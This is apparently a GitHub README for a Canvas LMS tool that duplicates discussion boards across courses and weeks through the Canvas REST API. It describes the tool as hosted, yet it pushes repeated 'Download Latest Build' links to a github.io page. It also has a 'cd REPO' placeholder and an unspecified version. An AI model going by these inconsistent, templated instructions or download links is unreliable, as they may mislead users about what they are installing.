# Canvas Discussion Duplicator - Education Automation Tool 2026

> **Canvas Discussion Duplicator is a hosted web application that uses the Canvas REST API to copy and organize Canvas LMS discussions across courses and teaching weeks.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20Specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/frankkoch85/canvas-course-discussion-duplicator?style=flat-square)](https://github.com/frankkoch85/canvas-course-discussion-duplicator)

---

<p align="center">
  <a href="https://frankkoch85.github.io/canvas-course-discussion-duplicator/">
    <img src="https://img.shields.io/badge/Download-Canvas%20Discussion%20Duplicator%20Latest-brightgreen?style=for-the-badge" alt="Download Canvas Discussion Duplicator">
  </a>
</p>

> **[Direct Download - Canvas Discussion Duplicator](https://frankkoch85.github.io/canvas-course-discussion-duplicator/)**

---

[Download Latest Build](https://frankkoch85.github.io/canvas-course-discussion-duplicator/)

---

## About Canvas Discussion Duplicator

Canvas Discussion Duplicator is a browser-based course management utility built for instructors and education teams who work with discussion boards in Canvas LMS. When the same discussion structure needs to appear in several weeks or in more than one course, the tool replicates it for you and cuts down on manual setup.

It talks to Canvas through the Canvas REST API and gives you controls for matching, renaming, reviewing, and publishing duplicated discussions. A pre-run check shows the planned changes first, so you can inspect what will happen before anything is written to Canvas.

---

## Features

- Replicate Canvas discussions into several teaching weeks at once.
- Move discussion copies between one or more Canvas courses.
- Assign new names to discussions as part of the duplication workflow.
- Locate source discussions by exact title or by a unique partial title.
- Inspect planned changes with a pre-run check before any writes occur.
- Publish duplicated discussions when that is required.
- Communicate with Canvas via the Canvas REST API.
- Run the tool as a hosted web service.

---

## Installation

Canvas Discussion Duplicator runs as a web application and can be deployed through a service such as Render.

Clone the repository and move into its directory:

    git clone https://github.com/frankkoch85/canvas-course-discussion-duplicator.git
    cd REPO

Install the Python dependencies the project defines, then launch the web application through its configured Python entry point. For a hosted setup, connect the repository to Render and supply the runtime configuration the service needs.

Since the project is web-based, the usual first-run step is to open the application URL in a browser once the service is running.

---

## Usage

1. Open the hosted Canvas Discussion Duplicator web application.
2. Enter the Canvas connection details the application asks for.
3. Pick the source course and the discussion or discussions to process.
4. Choose the destination course or courses and the relevant weeks.
5. Apply exact-title or unique partial-title matching, whichever fits the task.
6. Provide new names for duplicated discussions where needed.
7. Run the pre-check and go over the proposed changes.
8. Confirm the operation to create the duplicates.
9. Turn on publishing for any discussions that should be published after duplication.

The pre-run review exists so you can verify course targets, matched discussions, names, and publishing choices before changes are sent through the Canvas REST API.

---

## Configuration

Settings come from the web application's deployment environment rather than from a desktop preferences file. If you deploy with Render, add the Canvas API and application settings the project requires to the service environment.

A typical deployment configuration may look like this:

    CANVAS_BASE_URL=https://canvas.example.edu
    CANVAS_API_TOKEN=your_canvas_api_token

Use the exact variable names and values that the application deployment files expect. Keep API credentials out of source control and set them through the hosting provider's environment settings.

---

## Requirements

- A web browser to access the application.
- Access to a Canvas LMS instance.
- Canvas API credentials with permissions for the selected courses and discussions.
- Python runtime support for running the application locally.
- A hosting environment such as Render for a hosted deployment.
- Network access between the application and the Canvas REST API.
- Storage and runtime resources suited to the selected hosting configuration.

---

## FAQ

### Who is this tool for?

Instructors and course administrators who need to reuse Canvas discussions across multiple weeks or courses.

### Can it copy discussions between courses?

Yes. The workflow supports copying discussions across one or more Canvas courses.

### How are source discussions selected?

A discussion can be matched by its exact title or by a unique partial title.

### Can I rename a duplicated discussion?

Yes. Renaming is part of the duplication process.

### Does the tool publish discussions automatically?

Publishing is an explicit option. Check the pre-run results and your publishing selection before confirming the operation.

### Where should configuration be added?

For a hosted deployment, use the service environment settings, such as those provided by Render. For local execution, follow the configuration expected by the project's Python application files.

### What should I check if a run does not work?

Make sure the Canvas URL is correct, the API credentials are configured, the account can reach the selected courses, and the discussion title produces an exact or unique partial match. Review the pre-run check before trying the operation again.

### How are updates delivered?

Updates come from the repository or from the hosted deployment associated with the project. The available project metadata does not specify a current release version.

---

## Roadmap

- Refine the discussion selection and review workflow.
- Improve course and week organization for larger duplication tasks.
- Continue improving hosted deployment usability.
- Expand guidance for Canvas API configuration and troubleshooting.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
